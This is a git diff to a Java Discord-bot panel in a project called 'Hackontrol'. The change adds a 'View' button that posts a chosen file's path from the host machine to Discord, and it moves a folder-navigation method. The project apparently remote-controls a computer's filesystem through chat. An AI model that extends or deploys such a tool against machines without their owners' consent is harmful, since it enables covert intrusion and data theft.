@@ -13,6 +13,7 @@ import com.khopan.hackontrol.service.interaction.ModalManager;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.LargeMessage;
 import com.khopan.hackontrol.utils.interaction.HackontrolButton;
+import com.khopan.hackontrol.utils.sendable.ISendable;
 import com.khopan.hackontrol.widget.ControlWidget;
 
 import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
@@ -20,6 +21,7 @@ import net.dv8tion.jda.api.interactions.components.ItemComponent;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
 import net.dv8tion.jda.api.interactions.components.text.TextInput;
 import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
+import net.dv8tion.jda.api.utils.messages.MessageCreateData;
 
 public class FilePanel extends Panel {
 	private static final String PANEL_NAME = "file";
@@ -92,6 +94,7 @@ public class FilePanel extends Panel {
 		File finalFolder = folder;
 		LargeMessage.send(builder.toString(), callback, (request, identifiers) -> {
 			List<ItemComponent> list = new ArrayList<>();
+			list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "View", context -> this.buttonView(context, fileList, folderList)));
 
 			if(!folderList.isEmpty()) {
 				list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Inside", context -> this.buttonInside(context, folderList)));
@@ -112,6 +115,46 @@ public class FilePanel extends Panel {
 			list.add(HackontrolButton.delete(identifiers));
 			request.addActionRow(list);
 		});
+	}
+
+	private void sendFileView(File file, ISendable sender) {
+		sender.send(MessageCreateData.fromContent("`File: " + file.getAbsolutePath() + '`'), null);
+	}
+
+	private void buttonView(ButtonContext context, List<File> fileList, List<File> folderList) {
+		int folderSize = folderList.size();
+		int maximum = fileList.size() + folderSize;
+
+		if(maximum == 1) {
+			this.sendFileView(folderSize == 0 ? fileList.get(0) : folderList.get(0), context.reply());
+			return;
+		}
+
+		context.replyModal(ModalManager.dynamicModal("View", modalContext -> {
+			int index = this.parseIndex(modalContext, maximum);
+
+			if(index != -1) {
+				this.sendFileView(index >= folderSize ? fileList.get(index - folderSize) : folderList.get(index), modalContext.reply());
+			}
+		}).addActionRow(TextInput.create(FilePanel.KEY_SHELL_OBJECT_INDEX, "Index", TextInputStyle.SHORT).setRequired(true).setMinLength(1).setMaxLength(Integer.toString(maximum).length()).setPlaceholder("1 - " + maximum).build()).build()).queue();
+	}
+
+	private void buttonInside(ButtonContext context, List<File> folderList) {
+		if(folderList.size() == 1) {
+			this.sendFileList(folderList.get(0), context);
+			HackontrolButton.deleteMessages(context);
+			return;
+		}
+
+		int size = folderList.size();
+		context.replyModal(ModalManager.dynamicModal("Inside", modalContext -> {
+			int index = this.parseIndex(modalContext, size);
+
+			if(index != -1) {
+				this.sendFileList(folderList.get(index), modalContext);
+				HackontrolButton.deleteMessages(context);
+			}
+		}).addActionRow(TextInput.create(FilePanel.KEY_SHELL_OBJECT_INDEX, "Folder Index", TextInputStyle.SHORT).setRequired(true).setMinLength(1).setMaxLength(Integer.toString(size).length()).setPlaceholder("1 - " + size).build()).build()).queue();
 	}
 
 	private int appendShellObject(StringBuilder builder, String name, List<File> list, int index, boolean absolute) {
@@ -146,24 +189,6 @@ public class FilePanel extends Panel {
 		}
 
 		return index;
-	}
-
-	private void buttonInside(ButtonContext context, List<File> folderList) {
-		if(folderList.size() == 1) {
-			this.sendFileList(folderList.get(0), context);
-			HackontrolButton.deleteMessages(context);
-			return;
-		}
-
-		int size = folderList.size();
-		context.replyModal(ModalManager.dynamicModal("Inside", modalContext -> {
-			int index = this.parseIndex(modalContext, size);
-
-			if(index != -1) {
-				this.sendFileList(folderList.get(index), modalContext);
-				HackontrolButton.deleteMessages(context);
-			}
-		}).addActionRow(TextInput.create(FilePanel.KEY_SHELL_OBJECT_INDEX, "Folder Index", TextInputStyle.SHORT).setRequired(true).setMinLength(1).setMaxLength(Integer.toString(size).length()).setPlaceholder("1 - " + size).build()).build()).queue();
 	}
 
 	private int parseIndex(ModalContext context, int maximum) {
